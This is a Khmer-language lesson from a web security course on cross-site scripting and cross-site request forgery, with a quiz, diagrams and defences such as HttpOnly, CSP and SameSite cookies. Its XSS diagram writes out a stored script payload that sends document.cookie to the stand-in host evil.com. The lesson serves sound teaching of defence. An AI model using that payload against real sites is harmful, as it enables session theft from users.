---
title: Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF)
description: យល់ដឹងពីយន្តការវាយប្រហារ XSS (Stored/Reflected), CSRF Attacks, SameSite Cookie Attributes, និងយុទ្ធសាស្ត្រការពារ។
objectives:
  - យល់ពីភាពខុសគ្នារវាង XSS (ការចាក់កូដ JavaScript បន្លំ) និង CSRF (ការបន្លំធ្វើសកម្មភាពជំនួស)
  - ស្គាល់ប្រភេទនៃ XSS (Stored XSS, Reflected XSS, DOM XSS)
  - ចេះប្រើប្រាស់ SameSite Cookie Attribute (Strict, Lax, None) ដើម្បីកម្ចាត់ CSRF
  - យល់ពីការប្រើប្រាស់ CSRF Tokens ក្នុង Traditional Cookie Forms
module: module-6-security
order: 6
quiz:
  - question: "តើ Cookie Attribute ណាដែលជួយការពារ CSRF Attacks បានយ៉ាងមានប្រសិទ្ធភាពបំផុតដោយមិនឱ្យ Browser ផ្ញើ Cookie ទៅកាន់ Cross-Site Requests?"
    options:
      - "`path='/'`"
      - "`sameSite: 'strict'` ឬ `sameSite: 'lax'`"
      - "`domain='localhost'`"
      - "`version='1.0'`"
    correctAnswer: 2
    explanation: "`sameSite: 'strict'` បញ្ជា Browser មិនឱ្យបញ្ជូន Cookie ទៅជាមួយ request ណាដែលកើតចេញពី Domain ផ្សេងឡើយ ដែលជាខែលការពារ CSRF ដ៏រឹងមាំបំផុត។"
---

## 💥 1. Cross-Site Scripting (XSS)

**XSS** កើតឡើងនៅពេលដែល Hacker បញ្ចូលកូដ JavaScript ដែលបង្កប់គ្រោះថ្នាក់ (Malicious Script) ទៅក្នុងគេហទំព័រ ហើយ Browser របស់អ្នកប្រើប្រាស់ផ្សេងទៀតដំណើរការកូដនោះ។

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Hacker
    participant Server as Express Backend
    participant DB as Database
    actor Victim as Innocent User

    Attacker->>Server: 1. POST Comment: "<script>fetch('http://evil.com?c=' + document.cookie)</script>"
    Server->>DB: 2. រក្សាទុកកូដគ្រោះថ្នាក់ក្នុង DB
    Victim->>Server: 3. GET /comments
    Server->>Victim: 4. បញ្ជូន HTML/JSON ដែលមាន script
    Note over Victim: Browser ដំណើរការ script រួចលួចបញ្ជូន Token ទៅកាន់ evil.com! 💥
```

### 🛡️ វិធីការពារ XSS:
1. **HttpOnly Cookies:** ការពារមិនឱ្យ JavaScript អាន Cookie សម្ងាត់បាន
2. **HTML Sanitization / Escaping:** សម្អាត tags `<script>`, `<iframe>`, `onerror`
3. **Content Security Policy (CSP):** បិទមិនឱ្យ Run Inline Scripts

---

## 🎭 2. Cross-Site Request Forgery (CSRF)

**CSRF** គឺជាការវាយប្រហារដែល Hacker បង្ខំ Browser របស់ជនរងគ្រោះឱ្យផ្ញើ Request ដែលមាន Session Cookie ស្រាប់ទៅកាន់ Server របស់ជនរងគ្រោះដោយមិនដឹងខ្លួន។

```mermaid
graph LR
    HACKER["Evil Website (evil.com)"] -->|"Hidden Form POST to bank.com/transfer"| BROWSER["User Browser (Logged in)"]
    BROWSER -->|"Auto-attaches bank.com session cookie"| BANK["Bank Server executes unauthorized transfer! 💸"]
```

### 🛡️ វិធីការពារ CSRF:
1. **SameSite Cookie Attribute:**
   ```javascript
   res.cookie('token', jwtToken, {
     httpOnly: true,
     secure: true,
     sameSite: 'lax', // ឬ 'strict'
   });
   ```
2. **Custom Request Headers:** REST APIs ដែលផ្ញើទិន្នន័យតាម `Authorization: Bearer <token>` មិនងាយរងគ្រោះនឹង CSRF ដូច Cookie-based forms ឡើយ។
